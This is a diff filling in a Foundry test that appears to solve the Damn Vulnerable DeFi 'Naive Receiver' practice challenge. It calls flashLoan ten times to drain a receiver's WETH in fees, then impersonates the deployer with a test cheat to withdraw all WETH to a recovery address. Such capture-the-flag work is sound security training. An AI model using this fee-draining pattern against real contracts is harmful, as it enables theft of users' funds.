@@ -77,7 +77,18 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        for (uint256 i = 0; i < 10; i++) {
+            pool.flashLoan(
+                receiver,
+                address(weth),
+                0,
+                ""
+            );
+        }
+
+        vm.startPrank(deployer);
+        pool.withdraw(WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery));
+        vm.stopPrank();
     }
 
     /**
